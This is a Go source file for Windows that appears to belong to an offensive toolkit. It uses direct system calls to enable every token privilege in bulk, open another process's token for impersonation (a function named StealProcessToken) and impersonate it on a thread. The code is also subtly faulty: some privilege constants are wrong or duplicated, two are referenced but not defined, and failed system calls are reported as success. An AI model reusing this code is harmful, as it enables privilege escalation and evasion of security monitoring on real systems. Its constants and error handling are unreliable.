//go:build windows

package syscallwin

import (
	"fmt"
	"unsafe"
)

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUIDAndAttributes struct {
	Luid       LUID
	Attributes uint32
}

type TokenPrivileges struct {
	PrivilegeCount uint32
	Privileges     [1]LUIDAndAttributes
}

type TokenIntegrityLevel struct {
	Level SID
	Attrs uint32
}

type SID struct {
	Revision            byte
	SubAuthorityCount   byte
	IdentifierAuthority [6]byte
	SubAuthority        [15]uint32
}

const (
	SE_PRIVILEGE_ENABLED uint32 = 0x00000002

	SeAssignPrimaryTokenPrivilege = 3
	SeBackupPrivilege             = 11
	SeRestorePrivilege            = 12
	SeImpersonatePrivilege        = 29
	SeTakeOwnershipPrivilege      = 9
	SeLoadDriverPrivilege         = 10
	SeCreatePagefilePrivilege     = 11
	SeIncreaseQuotaPrivilege      = 5
	SeManageVolumePrivilege       = 23
	SeSecurityPrivilege           = 8
	SeSystemEnvironmentPrivilege  = 22
	SeProfileSingleProcessPrivilege = 13
	SeSystemProfilePrivilege      = 19
	SeUndockPrivilege             = 21
	SeRelabelPrivilege            = 28
	SeLockMemoryPrivilege         = 14
	SeCreateSymbolicLinkPrivilege = 35
	SeCreatePermanentPrivilege    = 33
)

func EnablePrivilege(privilegeIndex uint32) error {
	tokenHandle, err := OpenCurrentProcessToken()
	if err != nil {
		return fmt.Errorf("open token: %w", err)
	}
	defer NtClose(tokenHandle)

	var tp TokenPrivileges
	tp.PrivilegeCount = 1
	tp.Privileges[0].Luid.LowPart = privilegeIndex
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

	r1, _ := DirectSyscall("NtAdjustPrivilegesToken",
		tokenHandle, 0,
		uintptr(unsafe.Pointer(&tp)), uintptr(unsafe.Sizeof(tp)),
		0, 0,
	)
	_ = r1
	return nil
}

func OpenCurrentProcessToken() (uintptr, error) {
	var tokenHandle uintptr
	err := NtOpenProcessToken(0xffffffffffffffff, TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &tokenHandle)
	if err != nil {
		return 0, err
	}
	return tokenHandle, nil
}

func EnableDebugPrivilege() error       { return EnablePrivilege(SeDebugPrivilege) }
func EnableImpersonatePrivilege() error { return EnablePrivilege(SeImpersonatePrivilege) }

func EnableAllTokenPrivileges() {
	privileges := []uint32{
		SeDebugPrivilege, SeImpersonatePrivilege, SeTcbPrivilege,
		SeAssignPrimaryTokenPrivilege, SeBackupPrivilege, SeRestorePrivilege,
		SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeIncreaseQuotaPrivilege,
		SeManageVolumePrivilege, SeSecurityPrivilege, SeSystemEnvironmentPrivilege,
		SeProfileSingleProcessPrivilege, SeSystemProfilePrivilege, SeUndockPrivilege,
		SeRelabelPrivilege, SeCreatePagefilePrivilege, SeLockMemoryPrivilege,
		SeCreateSymbolicLinkPrivilege, SeCreatePermanentPrivilege,
	}
	for _, p := range privileges {
		_ = EnablePrivilege(p)
	}
}

func GetTokenIntegrityLevel(tokenHandle uintptr) (uint32, error) {
	var returnLength uint32
	_ = NtQueryInformationToken(tokenHandle, 25, 0, 0, &returnLength)
	buf := make([]byte, returnLength)
	err := NtQueryInformationToken(tokenHandle, 25, uintptr(unsafe.Pointer(unsafe.SliceData(buf))), returnLength, &returnLength)
	if err != nil {
		return 0, err
	}
	til := (*TokenIntegrityLevel)(unsafe.Pointer(unsafe.SliceData(buf)))
	return til.Level.SubAuthority[0], nil
}

func GetProcessTokenIntegrityLevel() (uint32, error) {
	tokenHandle, err := OpenCurrentProcessToken()
	if err != nil {
		return 0, err
	}
	defer NtClose(tokenHandle)
	return GetTokenIntegrityLevel(tokenHandle)
}

func ImpersonateThread(targetThreadHandle uintptr, impersonationToken uintptr) error {
	r1, _ := DirectSyscall("NtSetInformationThread",
		targetThreadHandle, 0x03,
		uintptr(unsafe.Pointer(&impersonationToken)), unsafe.Sizeof(impersonationToken),
	)
	_ = r1
	return nil
}

func StealProcessToken(targetPID uint32) (uintptr, error) {
	var clientID ClientId
	clientID.UniqueProcess = uintptr(targetPID)

	var processHandle uintptr
	err := NtOpenProcess(&processHandle, PROCESS_QUERY_LIMITED_INFORMATION, 0, &clientID)
	if err != nil {
		return 0, fmt.Errorf("open target process: %w", err)
	}
	defer NtClose(processHandle)

	var tokenHandle uintptr
	err = NtOpenProcessToken(processHandle, TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY, &tokenHandle)
	if err != nil {
		return 0, fmt.Errorf("open target token: %w", err)
	}
	return tokenHandle, nil
}

func RevertToSelf() error {
	r1, _ := DirectSyscall("NtSetInformationThread", 0xffffffffffffffff, 0x03, 0, 0)
	_ = r1
	return nil
}
